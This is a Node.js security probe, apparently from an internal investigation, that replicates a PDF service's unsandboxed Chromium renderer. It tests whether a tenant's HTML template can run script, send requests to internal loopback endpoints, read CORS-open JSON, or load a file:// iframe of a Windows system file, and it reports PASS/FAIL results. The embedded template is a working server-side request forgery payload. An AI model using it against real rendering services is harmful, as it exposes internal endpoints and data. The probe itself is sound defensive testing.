// Probe 2: what happens when a company-authored template reaches the host's PDF renderer.
// The host (document_inteligence/host.mjs renderPdf) launches Chromium with --no-sandbox and calls
// page.setContent(html) with JavaScript enabled. This probe REPLICATES that exact launch and call
// (it does not import host.mjs, which is not exported) against a harmless loopback server it starts itself.
//
// Run:  node report/adaptation-investigation/probes/p2-template-chromium.mjs
import http from "node:http";
import { createRequire } from "node:module";
import { pathToFileURL } from "node:url";

const require_ = createRequire("E:/000/UIv2/package.json");
const pw = await import(pathToFileURL(require_.resolve("playwright")).href);
const chromium = pw.chromium ?? pw.default.chromium;

const hits = [];
const server = http.createServer((req, res) => {
  hits.push(`${req.method} ${req.url} (cookie:${req.headers.cookie ? "yes" : "no"})`);
  if (req.url.startsWith("/cors")) {
    // same shape as server/index.mjs json(): Access-Control-Allow-Origin: *
    res.writeHead(200, { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" });
    return res.end(JSON.stringify({ internal: "LOOPBACK-JSON-READABLE" }));
  }
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ internal: "NO-CORS-HEADER" }));
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const port = server.address().port;

const template = `<html><body>
<div id="out">static</div>
<img src="http://127.0.0.1:${port}/img-beacon">
<iframe id="f" src="file:///C:/Windows/win.ini" width="10" height="10"></iframe>
<script>
document.getElementById('out').textContent = 'JS-RAN';
fetch('http://127.0.0.1:${port}/cors').then(r=>r.json()).then(j=>{document.body.insertAdjacentHTML('beforeend','<p id="r1">'+j.internal+'</p>')}).catch(e=>{document.body.insertAdjacentHTML('beforeend','<p id="r1">ERR '+e.message+'</p>')});
fetch('http://127.0.0.1:${port}/nocors').then(r=>r.json()).then(j=>{document.body.insertAdjacentHTML('beforeend','<p id="r2">'+j.internal+'</p>')}).catch(e=>{document.body.insertAdjacentHTML('beforeend','<p id="r2">BLOCKED '+e.message+'</p>')});
</script>
</body></html>`;

const browser = await chromium.launch({ headless: true, args: ["--no-sandbox"] }); // host's launch options
const page = await browser.newPage();
await page.setContent(template, { waitUntil: "load", timeout: 20000 });          // host's call
await page.waitForTimeout(800);
const out = await page.evaluate(() => ({
  out: document.getElementById("out")?.textContent,
  r1: document.getElementById("r1")?.textContent,
  r2: document.getElementById("r2")?.textContent,
  iframeBody: (() => { try { return document.getElementById("f").contentDocument?.body?.innerText?.slice(0, 80) ?? "(no access)"; } catch (e) { return "BLOCKED " + e.name; } })(),
}));
const pdf = await page.pdf({ format: "A4", printBackground: true });
await page.close();
await browser.close();
server.close();

const rep = (id, claim, ok, detail) => console.log(`${ok ? "PASS" : "FAIL"} ${id} ${claim}  ::  ${detail}`);
rep("P2.1", "JavaScript inside a tenant template RUNS in the host's renderer configuration", out.out === "JS-RAN", `#out=${out.out}`);
rep("P2.2", "an <img> in the template makes the server-side browser issue a request to an internal address", hits.some((h) => h.includes("/img-beacon")), hits.join(" | "));
rep("P2.3", "script can READ a same-host JSON endpoint that sends Access-Control-Allow-Origin:* (as server/index.mjs json() does)", out.r1 === "LOOPBACK-JSON-READABLE", `r1=${out.r1}`);
rep("P2.4", "script CANNOT read a response without a CORS header", /BLOCKED/.test(out.r2 ?? ""), `r2=${out.r2}`);
rep("P2.5", "file:// iframe content is not readable from the template page (empty body)", (out.iframeBody ?? "") === "" || /BLOCKED|no access/.test(out.iframeBody), `iframeBody=${JSON.stringify(out.iframeBody)}`);
console.log(`NOTE P2.6 page.pdf() printed the live DOM after the script ran (pdf bytes=${pdf.length}); PDF text was NOT extracted here, so "script text lands in the published PDF" is inferred from how page.pdf works, not read back.`);
console.log("\nNOTE: no authentication cookie is sent from the about:blank page, so authenticated /api routes still refuse; the exposure is internal/unauthenticated HTTP reachable from the app container.");
